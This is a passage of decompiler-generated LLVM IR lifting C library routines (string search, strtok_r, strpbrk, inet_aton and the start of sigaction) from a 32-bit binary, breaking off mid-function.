  %v3_1000d27c = load i8, i8* %v2_1000d27c, align 1
  %v4_1000d27c = zext i8 %v3_1000d27c to i32
  store i32 %v1_1000d27c, i32* %r3.global-to-local, align 4
  %v0_1000d280 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d280 = add i32 %v0_1000d280, -1
  store i32 %v1_1000d280, i32* %r5.global-to-local, align 4
  %v1_1000d284 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d284 = icmp eq i32 %v4_1000d27c, %v1_1000d284
  %v0_1000d288 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d284, i32 %v0_1000d288)
  %v0_1000d28c = load i32, i32* %r3.global-to-local, align 4
  %v0_1000d290 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d290 = add i32 %v0_1000d290, -1
  store i32 %v1_1000d290, i32* %ctr.global-to-local, align 4
  %v2_1000d290 = icmp eq i32 %v1_1000d290, 0
  br i1 %v2_1000d290, label %dec_label_pc_1000d298.loopexit, label %dec_label_pc_1000d294

dec_label_pc_1000d294:                            ; preds = %entry, %dec_label_pc_1000d27c
  %v0_1000d27c = phi i32 [ %v0_1000d28c, %dec_label_pc_1000d27c ], [ %v2_1000d274, %entry ]
  %v0_1000d294.in.in = phi i32 [ %v0_1000d28c, %dec_label_pc_1000d27c ], [ %v2_1000d274, %entry ]
  %v0_1000d294.in = urem i32 %v0_1000d294.in.in, 4
  %v0_1000d294 = icmp eq i32 %v0_1000d294.in, 0
  br i1 %v0_1000d294, label %dec_label_pc_1000d298.loopexit, label %dec_label_pc_1000d27c

dec_label_pc_1000d298.loopexit:                   ; preds = %dec_label_pc_1000d294, %dec_label_pc_1000d27c
  %v0_1000d2c016.ph = phi i32 [ %v0_1000d28c, %dec_label_pc_1000d27c ], [ %v0_1000d27c, %dec_label_pc_1000d294 ]
  %v0_1000d298.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000d29c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d298

dec_label_pc_1000d298:                            ; preds = %dec_label_pc_1000d298.loopexit, %entry
  %v0_1000d29c = phi i32 [ 0, %entry ], [ %v0_1000d29c.pre, %dec_label_pc_1000d298.loopexit ]
  %v0_1000d298 = phi i32 [ %v1_1000d26c, %entry ], [ %v0_1000d298.pre, %dec_label_pc_1000d298.loopexit ]
  %v0_1000d2c016 = phi i32 [ %v2_1000d274, %entry ], [ %v0_1000d2c016.ph, %dec_label_pc_1000d298.loopexit ]
  %v1_1000d298 = mul i32 %v0_1000d298, 256
  %v1_1000d29c = udiv i32 %v0_1000d29c, 4
  %v2_1000d2a0 = or i32 %v1_1000d298, %v0_1000d298
  %v1_1000d2a8 = mul i32 %v2_1000d2a0, 65536
  %v2_1000d2b4 = or i32 %v1_1000d2a8, %v2_1000d2a0
  store i32 %v2_1000d2b4, i32* %r7.global-to-local, align 4
  store i32 -2130640640, i32* %r8.global-to-local, align 4
  store i32 %v1_1000d29c, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000d29c, 4
  br i1 %tmp, label %dec_label_pc_1000d338, label %dec_label_pc_1000d2c0

dec_label_pc_1000d2c0:                            ; preds = %dec_label_pc_1000d298, %dec_label_pc_1000d334.backedge.dec_label_pc_1000d2c0_crit_edge
  %v0_1000d33421 = phi i32 [ %v1_1000d334, %dec_label_pc_1000d334.backedge.dec_label_pc_1000d2c0_crit_edge ], [ %v1_1000d29c, %dec_label_pc_1000d298 ]
  %v0_1000d2e0 = phi i32 [ %v0_1000d2e0.pre, %dec_label_pc_1000d334.backedge.dec_label_pc_1000d2c0_crit_edge ], [ -2130640640, %dec_label_pc_1000d298 ]
  %v0_1000d2c8 = phi i32 [ %v0_1000d2c8.pre, %dec_label_pc_1000d334.backedge.dec_label_pc_1000d2c0_crit_edge ], [ %v2_1000d2b4, %dec_label_pc_1000d298 ]
  %v0_1000d2c4 = phi i32 [ %v0_1000d2c4.pre, %dec_label_pc_1000d334.backedge.dec_label_pc_1000d2c0_crit_edge ], [ %v0_1000d29c, %dec_label_pc_1000d298 ]
  %v0_1000d2c0 = phi i32 [ %v0_1000d2c0.pre, %dec_label_pc_1000d334.backedge.dec_label_pc_1000d2c0_crit_edge ], [ %v0_1000d2c016, %dec_label_pc_1000d298 ]
  %v1_1000d2c0 = add i32 %v0_1000d2c0, -4
  %v2_1000d2c0 = inttoptr i32 %v1_1000d2c0 to i32*
  %v3_1000d2c0 = load i32, i32* %v2_1000d2c0, align 4
  store i32 %v1_1000d2c0, i32* %r3.global-to-local, align 4
  %v1_1000d2c4 = add i32 %v0_1000d2c4, -4
  store i32 %v1_1000d2c4, i32* %r5.global-to-local, align 4
  %v2_1000d2c8 = xor i32 %v3_1000d2c0, %v0_1000d2c8
  %v1_1000d2cc = add i32 %v0_1000d2c0, -3
  %v1_1000d2d4 = add i32 %v2_1000d2c8, 2130640639
  %v1_1000d2dc = add i32 %v0_1000d2c0, -2
  %v2_1000d2d8 = sub i32 -1, %v2_1000d2c8
  %v2_1000d2e0 = xor i32 %v1_1000d2d4, %v2_1000d2d8
  %v3_1000d2e0 = and i32 %v2_1000d2e0, %v0_1000d2e0
  %v6_1000d2e0 = icmp eq i32 %v3_1000d2e0, 0
  %v1_1000d2e4 = add i32 %v0_1000d2c0, -1
  br i1 %v6_1000d2e0, label %dec_label_pc_1000d334.backedge, label %dec_label_pc_1000d2ec

dec_label_pc_1000d2ec:                            ; preds = %dec_label_pc_1000d2c0
  %v2_1000d2ec = inttoptr i32 %v1_1000d2e4 to i8*
  %v3_1000d2ec = load i8, i8* %v2_1000d2ec, align 1
  %v4_1000d2ec = zext i8 %v3_1000d2ec to i32
  %v1_1000d2f0 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d2f0 = icmp eq i32 %v4_1000d2ec, %v1_1000d2f0
  br i1 %v4_1000d2f0, label %dec_label_pc_1000d2f8, label %dec_label_pc_1000d300

dec_label_pc_1000d2f8:                            ; preds = %dec_label_pc_1000d2ec
  store i32 %v1_1000d2e4, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d2e4

dec_label_pc_1000d300:                            ; preds = %dec_label_pc_1000d2ec
  %v2_1000d300 = inttoptr i32 %v1_1000d2dc to i8*
  %v3_1000d300 = load i8, i8* %v2_1000d300, align 1
  %v4_1000d300 = zext i8 %v3_1000d300 to i32
  %v4_1000d304 = icmp eq i32 %v4_1000d300, %v1_1000d2f0
  br i1 %v4_1000d304, label %dec_label_pc_1000d30c, label %dec_label_pc_1000d314

dec_label_pc_1000d30c:                            ; preds = %dec_label_pc_1000d300
  store i32 %v1_1000d2dc, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d2dc

dec_label_pc_1000d314:                            ; preds = %dec_label_pc_1000d300
  %v2_1000d314 = inttoptr i32 %v1_1000d2cc to i8*
  %v3_1000d314 = load i8, i8* %v2_1000d314, align 1
  %v4_1000d314 = zext i8 %v3_1000d314 to i32
  %v4_1000d318 = icmp eq i32 %v4_1000d314, %v1_1000d2f0
  br i1 %v4_1000d318, label %dec_label_pc_1000d320, label %dec_label_pc_1000d328

dec_label_pc_1000d320:                            ; preds = %dec_label_pc_1000d314
  store i32 %v1_1000d2cc, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d2cc

dec_label_pc_1000d328:                            ; preds = %dec_label_pc_1000d314
  %v1_1000d328 = inttoptr i32 %v1_1000d2c0 to i8*
  %v2_1000d328 = load i8, i8* %v1_1000d328, align 1
  %v3_1000d328 = zext i8 %v2_1000d328 to i32
  %v4_1000d32c = icmp eq i32 %v3_1000d328, %v1_1000d2f0
  %v0_1000d330 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d32c, i32 %v0_1000d330)
  %v0_1000d334.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d334.backedge

dec_label_pc_1000d334.backedge:                   ; preds = %dec_label_pc_1000d328, %dec_label_pc_1000d2c0
  %v0_1000d334 = phi i32 [ %v0_1000d334.pre, %dec_label_pc_1000d328 ], [ %v0_1000d33421, %dec_label_pc_1000d2c0 ]
  %v1_1000d334 = add i32 %v0_1000d334, -1
  store i32 %v1_1000d334, i32* %ctr.global-to-local, align 4
  %v2_1000d334 = icmp eq i32 %v1_1000d334, 0
  br i1 %v2_1000d334, label %dec_label_pc_1000d334.dec_label_pc_1000d338_crit_edge, label %dec_label_pc_1000d334.backedge.dec_label_pc_1000d2c0_crit_edge

dec_label_pc_1000d334.backedge.dec_label_pc_1000d2c0_crit_edge: ; preds = %dec_label_pc_1000d334.backedge
  %v0_1000d2c0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000d2c4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000d2c8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000d2e0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000d2c0

dec_label_pc_1000d334.dec_label_pc_1000d338_crit_edge: ; preds = %dec_label_pc_1000d334.backedge
  %v0_1000d338.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d338

dec_label_pc_1000d338:                            ; preds = %dec_label_pc_1000d334.dec_label_pc_1000d338_crit_edge, %dec_label_pc_1000d298
  %v0_1000d338 = phi i32 [ %v0_1000d338.pre, %dec_label_pc_1000d334.dec_label_pc_1000d338_crit_edge ], [ %v0_1000d29c, %dec_label_pc_1000d298 ]
  %v1_1000d338 = add i32 %v0_1000d338, 1
  store i32 %v1_1000d338, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d338, i32* %ctr.global-to-local, align 4
  %v2_1000d3503 = icmp eq i32 %v0_1000d338, 0
  br i1 %v2_1000d3503, label %dec_label_pc_1000d354, label %dec_label_pc_1000d344

dec_label_pc_1000d344:                            ; preds = %dec_label_pc_1000d338, %dec_label_pc_1000d344
  %v0_1000d344 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000d344 = add i32 %v0_1000d344, -1
  %v2_1000d344 = inttoptr i32 %v1_1000d344 to i8*
  %v3_1000d344 = load i8, i8* %v2_1000d344, align 1
  %v4_1000d344 = zext i8 %v3_1000d344 to i32
  store i32 %v1_1000d344, i32* %r3.global-to-local, align 4
  %v1_1000d348 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d348 = icmp eq i32 %v4_1000d344, %v1_1000d348
  %v0_1000d34c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d348, i32 %v0_1000d34c)
  %v0_1000d350 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d350 = add i32 %v0_1000d350, -1
  store i32 %v1_1000d350, i32* %ctr.global-to-local, align 4
  %v2_1000d350 = icmp eq i32 %v1_1000d350, 0
  br i1 %v2_1000d350, label %dec_label_pc_1000d354, label %dec_label_pc_1000d344

dec_label_pc_1000d354:                            ; preds = %dec_label_pc_1000d344, %dec_label_pc_1000d338
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d350, { 1, 0 }
  uselistorder i32 %v0_1000d338, { 1, 2, 0 }
  uselistorder i32 %v1_1000d334, { 2, 1, 0 }
  uselistorder i32 %v1_1000d2e4, { 1, 0, 2 }
  uselistorder i32 %v1_1000d2dc, { 1, 0, 2 }
  uselistorder i32 %v1_1000d2cc, { 1, 0, 2 }
  uselistorder i32 %v2_1000d2a0, { 1, 0 }
  uselistorder i32 %v1_1000d29c, { 1, 0 }
  uselistorder i32 %v0_1000d298, { 1, 0 }
  uselistorder i32 %v0_1000d29c, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000d290, { 1, 0 }
  uselistorder i32 %v0_1000d28c, { 1, 0, 2 }
  uselistorder i32 %v2_1000d274, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1000d26c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 6, 7, 5, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 6, 2, 7, 8 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000d344, { 1, 0 }
  uselistorder label %dec_label_pc_1000d2c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d294, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d360 = load i32, i32* @lr, align 4
  store i32 %v0_1000d360, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1000d368 = icmp eq i32 %arg1, 0
  %v0_1000d370 = load i32, i32* @r5, align 4
  store i32 %v0_1000d370, i32* %r30.global-to-local, align 4
  %v0_1000d374 = load i32, i32* @r4, align 4
  store i32 %v0_1000d374, i32* %r29.global-to-local, align 4
  br i1 %v3_1000d368, label %dec_label_pc_1000d37c, label %dec_label_pc_1000d380

dec_label_pc_1000d37c:                            ; preds = %entry
  %v1_1000d37c = inttoptr i32 %v0_1000d370 to i32*
  %v2_1000d37c = load i32, i32* %v1_1000d37c, align 4
  store i32 %v2_1000d37c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d380

dec_label_pc_1000d380:                            ; preds = %entry, %dec_label_pc_1000d37c
  %v0_1000d380 = phi i32 [ %arg1, %entry ], [ %v2_1000d37c, %dec_label_pc_1000d37c ]
  store i32 %v0_1000d380, i32* @r3, align 4
  %v1_1000d384 = inttoptr i32 %v0_1000d380 to i8*
  %v2_1000d384 = call i32 @__GI_strspn(i8* %v1_1000d384)
  %v0_1000d388 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000d38c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d38c = add i32 %v0_1000d38c, %v2_1000d384
  %v3_1000d38c = inttoptr i32 %v2_1000d38c to i8*
  %v4_1000d38c = load i8, i8* %v3_1000d38c, align 1
  store i32 %v2_1000d38c, i32* @r31, align 4
  store i32 %v2_1000d38c, i32* @r3, align 4
  %v3_1000d398 = icmp eq i8 %v4_1000d38c, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d398, label %dec_label_pc_1000d3a4, label %dec_label_pc_1000d3ac

dec_label_pc_1000d3a4:                            ; preds = %dec_label_pc_1000d380
  %v1_1000d3a4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d3a4 = inttoptr i32 %v1_1000d3a4 to i32*
  store i32 %v2_1000d38c, i32* %v2_1000d3a4, align 4
  br label %dec_label_pc_1000d3e4

dec_label_pc_1000d3ac:                            ; preds = %dec_label_pc_1000d380
  store i32 268489648, i32* @lr, align 4
  %v3_1000d3ac = call i32 @__GI_strpbrk(i8* %v3_1000d38c, i32 %v0_1000d388)
  %v4_1000d3b4 = icmp eq i32 %v3_1000d3ac, 0
  %v0_1000d3b8 = load i32, i32* @r31, align 4
  store i32 %v0_1000d3b8, i32* @r3, align 4
  %v2_1000d3bc = add i32 %v3_1000d3ac, 1
  store i32 %v2_1000d3bc, i32* %r11.global-to-local, align 4
  br i1 %v4_1000d3b4, label %dec_label_pc_1000d3c4, label %dec_label_pc_1000d3d4

dec_label_pc_1000d3c4:                            ; preds = %dec_label_pc_1000d3ac
  store i32 268489672, i32* @lr, align 4
  %v4_1000d3c4 = call i32 @rawmemchr(i32 %v0_1000d3b8, i32 0, i32 0)
  %v0_1000d3c8 = load i32, i32* @r31, align 4
  store i32 %v0_1000d3c8, i32* %r0.global-to-local, align 4
  %v1_1000d3cc = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d3cc = inttoptr i32 %v1_1000d3cc to i32*
  store i32 %v4_1000d3c4, i32* %v2_1000d3cc, align 4
  br label %dec_label_pc_1000d3e4

dec_label_pc_1000d3d4:                            ; preds = %dec_label_pc_1000d3ac
  %v1_1000d3b4 = inttoptr i32 %v3_1000d3ac to i8*
  store i8 0, i8* %v1_1000d3b4, align 1
  %v0_1000d3dc = load i32, i32* @r31, align 4
  store i32 %v0_1000d3dc, i32* %r0.global-to-local, align 4
  %v0_1000d3e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d3e0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d3e0 = inttoptr i32 %v1_1000d3e0 to i32*
  store i32 %v0_1000d3e0, i32* %v2_1000d3e0, align 4
  br label %dec_label_pc_1000d3e4

dec_label_pc_1000d3e4:                            ; preds = %dec_label_pc_1000d3c4, %dec_label_pc_1000d3a4, %dec_label_pc_1000d3d4
  %v0_1000d3e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d360, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d3e4

; uselistorder directives
  uselistorder i32 %v3_1000d3ac, { 2, 0, 1 }
  uselistorder i32 %v2_1000d38c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000d380, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_1000d3e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d380, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000d41c1 = load i32, i32* @r3, align 4
  %v1_1000d41c2 = inttoptr i32 %v0_1000d41c1 to i8*
  %v2_1000d41c3 = load i8, i8* %v1_1000d41c2, align 1
  %v3_1000d41c4 = zext i8 %v2_1000d41c3 to i32
  store i32 %v3_1000d41c4, i32* %r11.global-to-local, align 4
  %v3_1000d4206 = icmp eq i8 %v2_1000d41c3, 0
  br i1 %v3_1000d4206, label %dec_label_pc_1000d430, label %dec_label_pc_1000d428

dec_label_pc_1000d400:                            ; preds = %dec_label_pc_1000d404
  %v3_1000d404 = zext i8 %v2_1000d404 to i32
  %v4_1000d410 = icmp eq i32 %v3_1000d404, %v1_1000d410
  %v0_1000d400 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d410, i32 %v0_1000d400)
  %v0_1000d404.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d410.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d404

dec_label_pc_1000d404:                            ; preds = %dec_label_pc_1000d428, %dec_label_pc_1000d400
  %v1_1000d410 = phi i32 [ %v1_1000d4109, %dec_label_pc_1000d428 ], [ %v1_1000d410.pre, %dec_label_pc_1000d400 ]
  %v0_1000d404 = phi i32 [ %tmp, %dec_label_pc_1000d428 ], [ %v0_1000d404.pre, %dec_label_pc_1000d400 ]
  %v1_1000d404 = inttoptr i32 %v0_1000d404 to i8*
  %v2_1000d404 = load i8, i8* %v1_1000d404, align 1
  %v1_1000d408 = add i32 %v0_1000d404, 1
  store i32 %v1_1000d408, i32* %r9.global-to-local, align 4
  %v3_1000d40c = icmp eq i8 %v2_1000d404, 0
  br i1 %v3_1000d40c, label %dec_label_pc_1000d418, label %dec_label_pc_1000d400

dec_label_pc_1000d418:                            ; preds = %dec_label_pc_1000d404
  %v0_1000d418 = load i32, i32* @r3, align 4
  %v1_1000d418 = add i32 %v0_1000d418, 1
  store i32 %v1_1000d418, i32* @r3, align 4
  %v1_1000d41c = inttoptr i32 %v1_1000d418 to i8*
  %v2_1000d41c = load i8, i8* %v1_1000d41c, align 1
  %v3_1000d41c = zext i8 %v2_1000d41c to i32
  store i32 %v3_1000d41c, i32* %r11.global-to-local, align 4
  %v3_1000d420 = icmp eq i8 %v2_1000d41c, 0
  br i1 %v3_1000d420, label %dec_label_pc_1000d430, label %dec_label_pc_1000d428

dec_label_pc_1000d428:                            ; preds = %entry, %dec_label_pc_1000d418
  %v1_1000d4109 = phi i32 [ %v3_1000d41c, %dec_label_pc_1000d418 ], [ %v3_1000d41c4, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d404

dec_label_pc_1000d430:                            ; preds = %dec_label_pc_1000d418, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000d404, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d428, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000d438 = icmp eq i8* %arg1, null
  br i1 %v3_1000d438, label %dec_label_pc_1000d4f0, label %dec_label_pc_1000d440

dec_label_pc_1000d440:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1000d454.pre = load i32, i32* @global_var_1001fd68, align 4
  br label %dec_label_pc_1000d450

dec_label_pc_1000d450:                            ; preds = %dec_label_pc_1000d440, %dec_label_pc_1000d4c8
  %v0_1000d4c8 = phi i32 [ 0, %dec_label_pc_1000d440 ], [ %v2_1000d4d0, %dec_label_pc_1000d4c8 ]
  %v0_1000d4cc = phi i32 [ 1, %dec_label_pc_1000d440 ], [ %v1_1000d4cc, %dec_label_pc_1000d4c8 ]
  %v0_1000d450 = phi i32 [ %tmp, %dec_label_pc_1000d440 ], [ %v0_1000d4503, %dec_label_pc_1000d4c8 ]
  %v1_1000d450 = inttoptr i32 %v0_1000d450 to i8*
  %v2_1000d450 = load i8, i8* %v1_1000d450, align 1
  %v3_1000d450 = zext i8 %v2_1000d450 to i32
  %v1_1000d458 = mul nuw nsw i32 %v3_1000d450, 2
  %v2_1000d45c = add i32 %v1_1000d458, %v3_1000d454.pre
  %v3_1000d45c = inttoptr i32 %v2_1000d45c to i16*
  %v4_1000d45c = load i16, i16* %v3_1000d45c, align 2
  %v1_1000d460 = and i16 %v4_1000d45c, 8
  %v3_1000d460 = icmp eq i16 %v1_1000d460, 0
  br i1 %v3_1000d460, label %dec_label_pc_1000d4f0, label %dec_label_pc_1000d468

dec_label_pc_1000d468:                            ; preds = %dec_label_pc_1000d450
  br label %dec_label_pc_1000d480

dec_label_pc_1000d470:                            ; preds = %dec_label_pc_1000d480
  %v1_1000d484 = mul i32 %v1_1000d4d0, 10
  %v2_1000d48c = add i32 %v3_1000d480, %v1_1000d484
  %v1_1000d470 = add i32 %v2_1000d48c, -48
  %v1_1000d474 = add i32 %v0_1000d4b8, 1
  %v2_1000d478 = icmp sgt i32 %v1_1000d470, 255
  br i1 %v2_1000d478, label %dec_label_pc_1000d4f0, label %dec_label_pc_1000d480

dec_label_pc_1000d480:                            ; preds = %dec_label_pc_1000d470, %dec_label_pc_1000d468
  %v1_1000d4d0 = phi i32 [ %v1_1000d470, %dec_label_pc_1000d470 ], [ 0, %dec_label_pc_1000d468 ]
  %v0_1000d4b8 = phi i32 [ %v1_1000d474, %dec_label_pc_1000d470 ], [ %v0_1000d450, %dec_label_pc_1000d468 ]
  %v1_1000d480 = inttoptr i32 %v0_1000d4b8 to i8*
  %v2_1000d480 = load i8, i8* %v1_1000d480, align 1
  %v3_1000d480 = zext i8 %v2_1000d480 to i32
  %v1_1000d488 = mul nuw nsw i32 %v3_1000d480, 2
  %v2_1000d490 = add i32 %v1_1000d488, %v3_1000d454.pre
  %v3_1000d490 = inttoptr i32 %v2_1000d490 to i16*
  %v4_1000d490 = load i16, i16* %v3_1000d490, align 2
  %v5_1000d490 = zext i16 %v4_1000d490 to i32
  %v1_1000d494 = and i32 %v5_1000d490, 8
  %v3_1000d494 = icmp eq i32 %v1_1000d494, 0
  br i1 %v3_1000d494, label %dec_label_pc_1000d49c, label %dec_label_pc_1000d470

dec_label_pc_1000d49c:                            ; preds = %dec_label_pc_1000d480
  %v2_1000d49c = icmp sgt i32 %v0_1000d4cc, 3
  br i1 %v2_1000d49c, label %dec_label_pc_1000d4b4, label %dec_label_pc_1000d4a4

dec_label_pc_1000d4a4:                            ; preds = %dec_label_pc_1000d49c
  %v3_1000d4a4 = icmp eq i8 %v2_1000d480, 46
  br i1 %v3_1000d4a4, label %dec_label_pc_1000d4ac, label %dec_label_pc_1000d4f0

dec_label_pc_1000d4ac:                            ; preds = %dec_label_pc_1000d4a4
  %v1_1000d4ac = add i32 %v0_1000d4b8, 1
  br label %dec_label_pc_1000d4c8

dec_label_pc_1000d4b4:                            ; preds = %dec_label_pc_1000d49c
  %v3_1000d4b4 = icmp eq i8 %v2_1000d480, 0
  %v1_1000d4b8 = add i32 %v0_1000d4b8, 1
  br i1 %v3_1000d4b4, label %dec_label_pc_1000d4c8, label %dec_label_pc_1000d4c0

dec_label_pc_1000d4c0:                            ; preds = %dec_label_pc_1000d4b4
  %v1_1000d4c0 = and i32 %v5_1000d490, 32
  %v3_1000d4c0 = icmp eq i32 %v1_1000d4c0, 0
  br i1 %v3_1000d4c0, label %dec_label_pc_1000d4f0, label %dec_label_pc_1000d4c8

dec_label_pc_1000d4c8:                            ; preds = %dec_label_pc_1000d4c0, %dec_label_pc_1000d4b4, %dec_label_pc_1000d4ac
  %v0_1000d4503 = phi i32 [ %v1_1000d4b8, %dec_label_pc_1000d4c0 ], [ %v1_1000d4b8, %dec_label_pc_1000d4b4 ], [ %v1_1000d4ac, %dec_label_pc_1000d4ac ]
  %v1_1000d4c8 = mul i32 %v0_1000d4c8, 256
  %v1_1000d4cc = add nuw nsw i32 %v0_1000d4cc, 1
  %v2_1000d4d0 = or i32 %v1_1000d4d0, %v1_1000d4c8
  store i32 %v2_1000d4d0, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1000d4cc, 5
  br i1 %tmp10, label %dec_label_pc_1000d450, label %dec_label_pc_1000d4dc

dec_label_pc_1000d4dc:                            ; preds = %dec_label_pc_1000d4c8
  %v0_1000d4dc = load i32, i32* @r4, align 4
  %v3_1000d4dc = icmp eq i32 %v0_1000d4dc, 0
  %v0_1000d4e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d4dc, i32 %v0_1000d4e4)
  %v0_1000d4e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d4e8 = load i32, i32* @r4, align 4
  %v2_1000d4e8 = inttoptr i32 %v1_1000d4e8 to i32*
  store i32 %v0_1000d4e8, i32* %v2_1000d4e8, align 4
  ret i32 1

dec_label_pc_1000d4f0:                            ; preds = %dec_label_pc_1000d4a4, %dec_label_pc_1000d4c0, %dec_label_pc_1000d450, %dec_label_pc_1000d470, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000d4d0, { 1, 0 }
  uselistorder i32 %v1_1000d4cc, { 1, 0 }
  uselistorder i32 %v0_1000d4b8, { 0, 1, 3, 2 }
  uselistorder i32 5, { 2, 6, 0, 7, 8, 1, 9, 10, 3, 11, 12, 4, 13, 5 }
  uselistorder i32 255, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -48, { 3, 2, 1, 0 }
  uselistorder i32 10, { 28, 1, 19, 2, 20, 0, 7, 11, 31, 12, 24, 13, 25, 26, 8, 21, 22, 23, 15, 14, 5, 6, 18, 3, 27, 16, 4, 10, 9, 30, 17, 29 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000d4f0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000d450, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000d4fc = load i32, i32* @lr, align 4
  store i32 %v0_1000d4fc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000d508 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_1000d518 = add i32 %tmp, 4
  store i32 %v1_1000d518, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000d520 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000d520, i32* @r3, align 4
  br i1 %v3_1000d508, label %dec_label_pc_1000d548, label %dec_label_pc_1000d528

dec_label_pc_1000d528:                            ; preds = %entry
  %v2_1000d528 = load i32, i32* %arg2, align 4
  store i32 %v2_1000d528, i32* %r0.global-to-local, align 4
  store i32 268490036, i32* @lr, align 4
  %v0_1000d530 = call i32 @memcpy()
  %v0_1000d534 = load i32, i32* @r31, align 4
  %v1_1000d534 = add i32 %v0_1000d534, 132
  %v2_1000d534 = inttoptr i32 %v1_1000d534 to i32*
  %v3_1000d534 = load i32, i32* %v2_1000d534, align 4
  store i32 %v3_1000d534, i32* %r0.global-to-local, align 4
  %v1_1000d540 = add i32 %v0_1000d534, 136
  %v2_1000d540 = inttoptr i32 %v1_1000d540 to i32*
  %v3_1000d540 = load i32, i32* %v2_1000d540, align 4
  store i32 %v3_1000d540, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d548

dec_label_pc_1000d548:                            ; preds = %entry, %dec_label_pc_1000d528
  store i32 268490088, i32* @lr, align 4
  %v0_1000d564 = call i32 @__syscall_rt_sigaction()
